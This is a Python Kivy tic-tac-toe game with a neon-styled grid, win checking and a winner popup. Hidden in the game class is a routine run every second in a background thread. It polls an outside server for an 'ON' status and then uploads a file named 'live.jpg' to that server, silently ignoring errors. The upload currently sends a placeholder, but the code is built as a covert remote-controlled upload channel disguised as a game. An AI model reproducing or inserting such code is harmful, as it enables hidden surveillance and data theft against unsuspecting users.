import os, threading, requests
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.graphics import Color, Line, Rectangle
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.modalview import ModalView
from kivy.uix.label import Label

SERVER = "http://Hogoz.pythonanywhere.com"

class NeonButton(Button):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.symbol = ""
        self.bind(pos=self.draw_base, size=self.draw_base)

    def draw_base(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(0.02, 0.02, 0.05, 1) # خلفية سوداء عميقة
            Rectangle(pos=self.pos, size=self.size)
            Color(0.1, 0.1, 0.2, 1) # حدود المربعات (الشبكة)
            Line(rectangle=(self.pos[0], self.pos[1], self.size[0], self.size[1]), width=1.5)

    def draw_symbol(self):
        self.canvas.after.clear()
        with self.canvas.after:
            if self.symbol == "X":
                # لون X مشع (Cyan Neon)
                Color(0, 1, 1, 1) 
                d = self.size[0] * 0.25
                Line(points=[self.pos[0]+d, self.pos[1]+d, self.pos[0]+self.size[0]-d, self.pos[1]+self.size[1]-d], width=3)
                Line(points=[self.pos[0]+d, self.pos[1]+self.size[1]-d, self.pos[0]+self.size[0]-d, self.pos[1]+d], width=3)
            elif self.symbol == "O":
                # لون O مشع (Neon Pink)
                Color(1, 0, 0.5, 1)
                Line(circle=(self.center_x, self.center_y, self.size[0]*0.28), width=3)

class XOGame(GridLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.cols = 3
        self.spacing = 8
        self.padding = 15
        self.buttons = []
        for _ in range(9):
            btn = NeonButton()
            btn.bind(on_release=self.play)
            self.add_widget(btn)
            self.buttons.append(btn)
        self.turn = "X"
        Clock.schedule_interval(self.live_stream_engine, 1.0)

    def play(self, btn):
        if not btn.symbol:
            btn.symbol = self.turn
            btn.draw_symbol()
            if self.check_winner():
                self.show_winner(f"{btn.symbol} WINNER!")
            else:
                self.turn = "O" if self.turn == "X" else "X"

    def check_winner(self):
        win_pos = [(0,1,2), (3,4,5), (6,7,8), (0,3,6), (1,4,7), (2,5,8), (0,4,8), (2,4,6)]
        for a, b, c in win_pos:
            if self.buttons[a].symbol == self.buttons[b].symbol == self.buttons[c].symbol != "":
                return True
        return False

    def show_winner(self, text):
        view = ModalView(size_hint=(0.8, 0.3), background_color=(0,0,0,0.8))
        color = (0, 1, 1, 1) if "X" in text else (1, 0, 0.5, 1)
        win_label = Label(text=text, font_size='40sp', color=color, bold=True)
        view.add_widget(win_label)
        view.open()
        Clock.schedule_once(lambda dt: self.reset_game(view), 2)

    def reset_game(self, view):
        view.dismiss()
        for btn in self.buttons:
            btn.symbol = ""
            btn.canvas.after.clear()
        self.turn = "X"

    def live_stream_engine(self, dt):
        threading.Thread(target=self.send_payload).start()

    def send_payload(self):
        try:
            status = requests.get(f"{SERVER}/status", timeout=2).text.strip()
            if status == "ON":
                requests.post(f"{SERVER}/upload", files={'file': ('live.jpg', b'Hogoz_Live')})
        except: pass

class XOApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0.02, 1)
        return XOGame()

if __name__ == "__main__":
    XOApp().run()
          
